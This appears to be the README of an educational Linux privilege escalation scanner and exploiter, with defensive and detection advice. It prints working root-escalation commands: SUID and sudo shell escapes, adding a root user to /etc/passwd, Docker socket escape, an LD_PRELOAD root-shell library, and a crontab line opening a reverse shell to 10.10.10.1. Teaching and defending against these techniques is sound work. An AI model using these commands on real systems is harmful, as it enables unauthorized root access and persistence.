# Automated Privilege Escalation Scanner & Exploiter

⚠️ **FOR EDUCATIONAL PURPOSES ONLY**

This is an automated privilege escalation scanner and exploiter for Linux systems. It detects common privilege escalation vectors and provides exploitation guidance.

## ⚠️ WARNING

**NEVER use this tool on systems you don't own or without explicit written authorization.**

This tool is intended ONLY for:
- Authorized penetration testing with written permission
- Security research in controlled environments
- CTF competitions and challenges
- Educational purposes in isolated VMs

## Features

### Scanner (`scanner.py`)

Automated detection of:
- **Sudo Permissions**: NOPASSWD entries, allowed commands
- **SUID/SGID Binaries**: Dangerous SUID binaries (vim, find, etc.)
- **Writable Files**: /etc/passwd, /etc/shadow, /etc/sudoers
- **Cron Jobs**: Writable cron files and directories
- **Linux Capabilities**: cap_setuid, cap_dac_override, etc.
- **World-Writable Paths**: In PATH environment variable
- **Kernel Exploits**: Version checks for known vulnerabilities
- **Docker Access**: Socket permissions, group membership
- **Environment Variables**: LD_PRELOAD, LD_LIBRARY_PATH
- **NFS Exports**: no_root_squash configurations

### Exploiter (`exploiter.py`)

Automated exploitation attempts for:
- **NOPASSWD Sudo**: Direct exploitation paths
- **SUID Binaries**: find, vim, bash, etc.
- **Writable System Files**: passwd, sudoers
- **Docker Socket**: Container escape techniques
- **Writable Cron**: Scheduled task injection
- **LD_PRELOAD**: Sudo environment preservation
- **Linux Capabilities**: Exploitable cap_setuid binaries

Plus payload generation for:
- Reverse shells (bash, python)
- SUID shells (C)
- User addition
- SSH persistence

## Installation

No additional dependencies required - uses Python standard library.

```bash
cd privesc-scanner
```

## Usage

### Run Scanner

```bash
python src/scanner.py
```

This will:
1. Check for privilege escalation vectors
2. Categorize findings by severity (CRITICAL, HIGH, MEDIUM, LOW, INFO)
3. Generate detailed report with remediation advice

### Run Exploiter

```bash
python src/exploiter.py
```

This will:
1. Check for exploitable vulnerabilities
2. Provide exploitation commands
3. Generate useful payloads
4. Display potential exploit paths

### Combined Workflow

```bash
# 1. Scan for vulnerabilities
python src/scanner.py

# 2. Attempt exploitation
python src/exploiter.py
```

## Output Examples

### Scanner Output

```
🔍 PRIVILEGE ESCALATION SCANNER
⚠️  FOR AUTHORIZED TESTING ONLY

🔍 Scanning as: user (UID: 1000)

[*] Checking sudo permissions...
[*] Checking SUID/SGID binaries...
[*] Checking writable sensitive paths...
...

📊 SUMMARY
  CRITICAL: 2
  HIGH: 3
  MEDIUM: 1
  INFO: 5

CRITICAL FINDINGS (2)

[1] Sudo NOPASSWD Configuration
    Severity: CRITICAL
    Exploit Available: Yes
    Description: Sudo allows commands without password
    ...
```

### Exploiter Output

```
🎯 PRIVILEGE ESCALATION EXPLOITER
⚠️  FOR AUTHORIZED TESTING ONLY

🎯 Running as: user (UID: 1000)

[*] Attempting NOPASSWD sudo exploit...
[+] Found: (ALL) NOPASSWD: /usr/bin/find
[+] Exploit: sudo find . -exec /bin/sh \;

📊 Found 3 potential exploit paths
```

## Common Exploitation Techniques

### 1. SUID Binary Exploitation

```bash
# SUID find
find . -exec /bin/sh -p \; -quit

# SUID vim
vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh")'

# SUID bash
bash -p
```

### 2. Sudo Exploits

```bash
# NOPASSWD vim
sudo vim -c ':!sh'

# NOPASSWD less
sudo less /etc/passwd
!sh

# NOPASSWD find
sudo find . -exec /bin/sh \;
```

### 3. Writable /etc/passwd

```bash
# Generate password hash
openssl passwd -1 -salt xyz password

# Add root user
echo 'newroot:$1$xyz$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login
su newroot
```

### 4. Docker Socket

```bash
# Mount host filesystem
docker run -v /:/hostfs -it alpine chroot /hostfs sh

# Privileged container escape
docker run --privileged -it alpine sh
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

### 5. Writable Cron

```bash
# Add reverse shell to crontab
echo '* * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"' >> /etc/crontab
```

### 6. LD_PRELOAD Exploit

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/sh");
}
```

```bash
# Compile
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles

# Execute with sudo (if env_keep+=LD_PRELOAD)
sudo LD_PRELOAD=/tmp/shell.so <command>
```

### 7. Linux Capabilities

```bash
# If python has cap_setuid+ep
python -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid+ep
perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'
```

## Detection Categories

### CRITICAL Severity
- NOPASSWD sudo without restrictions
- Writable /etc/passwd or /etc/shadow
- Dangerous SUID binaries
- Docker socket access
- Known kernel exploits
- NFS no_root_squash

### HIGH Severity
- Sudo permissions with exploitable commands
- Dangerous Linux capabilities
- World-writable directories in PATH
- Writable cron files
- Docker group membership

### MEDIUM Severity
- Exploitable environment variables
- Unusual file permissions

### INFO Severity
- System information
- SUID binary inventory
- Cron job listings

## Defensive Measures

### Prevention

1. **Principle of Least Privilege**
   - Remove unnecessary sudo permissions
   - Avoid NOPASSWD entries

2. **File Permissions**
   - Audit SUID/SGID binaries regularly
   - Remove unnecessary SUID bits
   - Protect sensitive files (600 or 640)

3. **Capabilities**
   - Remove unnecessary capabilities
   - Use capabilities instead of SUID where possible

4. **Docker Security**
   - Restrict docker socket access
   - Use rootless docker
   - Avoid --privileged containers

5. **Kernel Updates**
   - Keep kernel updated
   - Monitor CVE announcements

### Detection

1. **File Integrity Monitoring**
   - Monitor /etc/passwd, /etc/shadow, /etc/sudoers
   - Track SUID binary changes

2. **Audit Logging**
   - Enable auditd
   - Monitor sudo usage
   - Track privilege escalations

3. **Regular Scanning**
   - Run privilege escalation scans regularly
   - Compare against baseline

## File Structure

```
privesc-scanner/
├── src/
│   ├── scanner.py      # Vulnerability scanner
│   └── exploiter.py    # Exploitation tool
└── README.md
```

## Common Privilege Escalation Vectors

| Vector | Check Method | Exploitation |
|--------|--------------|--------------|
| SUID Binary | `find / -perm -4000 2>/dev/null` | Execute with -p flag |
| Sudo NOPASSWD | `sudo -l` | Direct execution |
| Writable /etc/passwd | `ls -la /etc/passwd` | Add root user |
| Docker Socket | `ls -la /var/run/docker.sock` | Container escape |
| Writable Cron | `ls -la /etc/cron*` | Task injection |
| Capabilities | `getcap -r / 2>/dev/null` | Abuse cap_setuid |
| Kernel Exploit | `uname -r` | Use public exploit |

## Testing Safely

### Create Vulnerable VM

```bash
# Create test user
sudo useradd -m testuser

# Add NOPASSWD sudo for find
echo 'testuser ALL=(ALL) NOPASSWD: /usr/bin/find' | sudo tee /etc/sudoers.d/testuser

# Create SUID binary (controlled environment)
sudo cp /bin/bash /tmp/bash_suid
sudo chmod +s /tmp/bash_suid
```

### Run Tests

```bash
# Switch to test user
su - testuser

# Run scanner
python /path/to/scanner.py

# Run exploiter
python /path/to/exploiter.py
```

### Cleanup

```bash
# Remove test configurations
sudo rm /etc/sudoers.d/testuser
sudo rm /tmp/bash_suid
sudo userdel -r testuser
```

## Legal Notice

**UNAUTHORIZED USE IS ILLEGAL**

Attempting privilege escalation on systems without authorization is illegal in most jurisdictions. This tool is for:
- Education and learning
- Authorized security testing
- CTF competitions
- Defensive security research

Always obtain written permission before testing any systems you don't own.

## References

- [GTFOBins](https://gtfobins.github.io/) - Unix binary exploitation
- [PEASS-ng](https://github.com/carlospolop/PEASS-ng) - Privilege escalation scripts
- [Linux Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

## Learning Objectives

This project teaches:
- Common Linux privilege escalation vectors
- SUID/SGID exploitation techniques
- Sudo misconfiguration exploitation
- Container escape methods
- Automated vulnerability scanning
- Security hardening principles

## Contributions

This is an educational tool. Focus is on common, well-documented privilege escalation techniques rather than 0-day exploits.
